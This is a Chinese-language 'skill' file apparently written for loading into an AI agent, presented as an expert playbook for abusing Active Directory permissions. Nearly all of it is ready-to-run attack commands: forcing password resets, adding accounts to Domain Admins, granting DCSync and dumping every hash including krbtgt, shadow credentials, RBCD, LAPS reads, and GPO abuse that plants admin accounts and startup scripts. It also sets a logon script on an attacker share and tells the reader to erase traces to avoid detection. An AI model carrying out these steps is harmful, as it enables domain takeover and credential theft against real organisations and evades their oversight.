# 技能：AD ACL 滥用 — 专家级攻击手册

> **AI 加载指令**：专家级 AD ACL 滥用技术。涵盖 BloodHound 列举、危险 ACE（GenericAll、WriteDACL、WriteOwner 等）、DCSync、影子凭证、定向 kerberoasting、组管理、LAPS 和 GPO 滥用。基础模型会遗漏复杂的 ACL 链利用和 Cypher 查询模式。

## 0. 相关路由

深入之前，请考虑加载：

- [active-directory-kerberos-attacks](../active-directory-kerberos-attacks/SKILL.md) 用于 Kerberos 攻击，通常与 ACL 滥用链式使用
- [active-directory-certificate-services](../active-directory-certificate-services/SKILL.md) 用于 ACL 滥用后的证书攻击
- [ntlm-relay-coercion](../ntlm-relay-coercion/SKILL.md) 用于可设置 ACL 的中继攻击（LDAP 中继）
- [windows-lateral-movement](../windows-lateral-movement/SKILL.md) 获取提升的 AD 访问权限后

### 高级参考

当您需要时，也加载 [BLOODHOUND_PATHS.md](./BLOODHOUND_PATHS.md)：
- 带有 Cypher 查询的常见 BloodHound 攻击路径
- 用于查找复杂链的定制 Neo4j 查询
- 数据收集和导入技巧

---

## 1. BloodHound 列举

### 数据收集

```bash
# SharpHound (从 Windows，加入域)
SharpHound.exe -c all --outputdirectory C:\temp --zipfilename bh.zip

# bloodhound-python (从 Linux)
bloodhound-python -d domain.com -u user -p password -c all -dc DC01.domain.com -ns DC_IP

# 特定收集方法
SharpHound.exe -c DCOnly          # 最快 — 仅 DC 查询
SharpHound.exe -c Session         # 仅会话数据（定期运行）
SharpHound.exe -c All,GPOLocalGroup  # 包含 GPO 分析
```

### 关键 BloodHound 查询（内置）

- "查找所有域管理员"
- "从所属主体到域管理员的最短路径"
- "查找具有 DCSync 权限的主体"
- "到无约束委派系统的最短路径"
- "查找域用户为本地管理员的工作站"

---

## 2. 危险的 ACE 类型

| ACE | 对用户的影响 | 对组的影响 | 对计算机的影响 |
|---|---|---|---|
| **GenericAll** | 修改密码、设置 SPN、修改属性 | 添加成员 | RBCD、LAPS 读取、所有属性 |
| **GenericWrite** | 设置 SPN、修改属性、影子凭证 | 添加成员 | RBCD、影子凭证 |
| **WriteDACL** | 授予自己任何权限 | 相同 | 相同 |
| **WriteOwner** | 取得所有权 → 然后 WriteDACL | 相同 | 相同 |
| **ForceChangePassword** | 不知旧密码即可重置密码 | N/A | N/A |
| **AddMember** | N/A | 添加自己/他人到组 | N/A |
| **AllExtendedRights** | 强制修改密码、读取 LAPS | N/A | 读取 LAPS、BitLocker 密钥 |
| **ReadLAPSPassword** | N/A | N/A | 读取本地管理员密码 |
| **WriteSPN** | 设置 SPN → 定向 kerberoasting | N/A | N/A |

---

## 3. 针对 ACE 的特定利用

### User 上的 GenericAll

```powershell
# 选项 1：强制修改密码
net user targetuser NewP@ss123 /domain

# 选项 2：定向 Kerberoasting
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/svc'}
# → Kerberoasting，然后清除 SPN

# 选项 3：影子凭证
Whisker.exe add /target:targetuser /domain:domain.com /dc:DC01

# 选项 4：设置登录脚本
Set-DomainObject -Identity targetuser -Set @{scriptpath='\\attacker\share\evil.ps1'}
```

### Computer 上的 GenericAll / GenericWrite

```bash
# RBCD 攻击
rbcd.py -delegate-from 'CONTROLLED$' -delegate-to 'TARGET$' -action write DOMAIN/user:pass -dc-ip DC

# Computer 上的影子凭证
pywhisker.py -d domain.com -u user -p pass --target 'TARGET$' --action add --dc-ip DC
```

### WriteDACL

```powershell
# 授予自己 DCSync 权限
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=com" -PrincipalIdentity lowpriv -Rights DCSync

# Impacket
dacledit.py -action write -rights DCSync -principal lowpriv -target-dn "DC=domain,DC=com" DOMAIN/lowpriv:pass -dc-ip DC
```

### WriteOwner

```powershell
# 步骤 1：取得所有权
Set-DomainObjectOwner -Identity targetuser -OwnerIdentity lowpriv

# 步骤 2：以所有者身份授予权限 WriteDACL
Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity lowpriv -Rights All

# 步骤 3：现在以 GenericAll 进行利用
```

### ForceChangePassword

```bash
# Impacket
rpcclient -U 'DOMAIN/attacker%pass' DC01 -c "setuserinfo2 targetuser 23 'NewP@ss123!'"

# PowerView
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewP@ss123!' -AsPlainText -Force)

# net rpc
net rpc password targetuser 'NewP@ss123!' -U DOMAIN/attacker%pass -S DC01
```

### AddMember 到组

```powershell
# 添加自己到特权组
Add-DomainGroupMember -Identity "Domain Admins" -Members lowpriv

# Impacket
net rpc group addmem "Domain Admins" lowpriv -U DOMAIN/attacker%pass -S DC01
```

---

## 4. DCSYNC 攻击

### 前置条件
主体需要在域对象上拥有这两种复制权限：
- `DS-Replication-Get-Changes`（GUID: `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`）
- `DS-Replication-Get-Changes-All`（GUID: `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`）

### 执行

```bash
# Impacket — 导出所有哈希
secretsdump.py DOMAIN/user:password@DC01 -just-dc

# 特定账户
secretsdump.py DOMAIN/user:password@DC01 -just-dc-user krbtgt

# Mimikatz
lsadump::dcsync /domain:domain.com /user:krbtgt
lsadump::dcsync /domain:domain.com /all /csv

# Impacket 带有 Kerberos 认证
export KRB5CCNAME=admin.ccache
secretsdump.py -k -no-pass DC01.domain.com -just-dc
```

### 默认谁拥有 DCSync？

- 域管理员
- 企业管理员
- 域控制器组
- `BUILTIN\Administrators`（在域对象上）

---

## 5. 影子凭证

### 攻击流程

在目标上写入 `msDS-KeyCredentialLink` → 生成证书 → 通过 PKINIT 进行认证。

```bash
# pyWhisker (Linux)
pywhisker.py -d domain.com -u attacker -p pass --target victim --action add --dc-ip DC01
# 输出：设备 ID 和 PFX 文件

# 使用证书进行认证
gettgtpkinit.py -cert-pfx victim.pfx -pfx-pass RANDOM_PASS domain.com/victim victim.ccache
export KRB5CCNAME=victim.ccache

# 从 TGT 提取 NT 哈希（用于 pass-the-hash）
getnthash.py -key AS_REP_KEY domain.com/victim
```

```powershell
# Whisker (Windows)
Whisker.exe add /target:victim /domain:domain.com /dc:DC01.domain.com
# → 提供用于获取 TGT 的 Rubeus 命令
Rubeus.exe asktgt /user:victim /certificate:CERT_B64 /password:PASS /ptt
```

**清理**：移除添加的密钥凭证以避免检测。

---

## 6. LAPS 密码读取

```powershell
# PowerView
Get-DomainComputer -Identity TARGET -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# AD 模块
Get-ADComputer -Identity TARGET -Properties ms-Mcs-AdmPwd | Select-Object ms-Mcs-AdmPwd

# LAPS v2 (Windows LAPS)
Get-LapsADPassword -Identity TARGET -AsPlainText

# CrackMapExec
crackmapexec ldap DC01 -u user -p pass --module laps
```

---

## 7. GPO 滥用

### 查找可写入的 GPO

```powershell
# PowerView — 查找您具有写入访问权限的 GPO
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {
    ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite') -and
    ($_.SecurityIdentifier -match 'YOUR_SID')
}
```

### 通过 SharpGPOAbuse 进行利用

```cmd
# 通过 GPO 添加本地管理员
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount lowpriv --GPOName "易受攻击的 GPO"

# 通过 GPO 添加计划任务
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\admin --Command "cmd.exe" --Arguments "/c net localgroup administrators lowpriv /add" --GPOName "易受攻击的 GPO"

# 添加启动脚本
SharpGPOAbuse.exe --AddComputerScript --ScriptName "evil.bat" --ScriptContents "net localgroup administrators lowpriv /add" --GPOName "易受攻击的 GPO"
```

```bash
# pyGPOAbuse (Linux)
pygpoabuse.py DOMAIN/user:pass -gpo-id "GPO_GUID" -command "net localgroup administrators lowpriv /add" -dc-ip DC01
```

---

## 8. ACL 攻击决策树

```
拥有域用户访问权限 — 想通过 ACL 提升权限
│
├── 运行 BloodHound → 分析到域管理员的最短路径
│   └── 上传数据 → "从所属主体到域管理员的最短路径"
│
├── 直接在用户对象上执行 ACL？
│   ├── GenericAll → 强制修改密码、影子凭证或定向 Kerberoasting (§3)
│   ├── GenericWrite → 影子凭证或设置 SPN (§3/§5)
│   ├── ForceChangePassword → 直接重置密码 (§3)
│   ├── WriteDACL → 授予自己 GenericAll，然后利用 (§3)
│   └── WriteOwner → 取得所有权 → WriteDACL → GenericAll (§3)
│
├── 组上的 ACL？
│   ├── AddMember / GenericAll → 添加自己到特权组 (§3)
│   └── WriteDACL → 授予 AddMember，然后添加自己
│
├── 计算机对象上的 ACL？
│   ├── GenericAll/GenericWrite → RBCD 攻击 (§3)
│   ├── AllExtendedRights → 读取 LAPS 密码 (§6)
│   └── GenericWrite → 机器上的影子凭证 (§5)
│
├── 域对象上的 ACL？
│   ├── WriteDACL → 授予自己 DCSync 权限 (§4)
│   └── 复制权限已存在？ → 直接 DCSync (§4)
│
├── 链接到特权 OUs 的 GPO 上的 ACL？
│   └── 写入权限 → 通过 GPO 添加管理员 / 计划任务 (§7)
│
└── 复杂的多跳链？
    └── 加载 BLOODHOUND_PATHS.md 用于 Cypher 查询和链分析
```
